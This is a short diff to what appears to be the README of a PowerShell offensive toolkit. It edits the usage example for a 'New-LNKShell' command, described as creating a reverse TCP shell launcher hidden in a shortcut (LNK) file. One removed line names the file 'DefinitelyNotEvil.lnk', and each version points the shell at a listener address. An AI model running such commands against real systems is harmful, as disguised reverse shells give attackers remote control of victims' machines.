@@ -44,7 +44,7 @@ Get-Substring -Start 'The quick' -End 'lazy dog' -Path C:\StoryAboutAFox.txt
 Creates a reverse TCP shell launcher embedded in a LNK file.
 
 ```
-New-LNKShell -LHOST 192.168.1.1 -LPORT -1234 -OutPath C:\Path\To\My\Shell -Filename DefinitelyNotEvil.lnk
+New-LNKShell -ComputerName 192.168.1.1 -Port 4444 -Application calc.exe
 ```
 
 ##Remove-Files.ps1
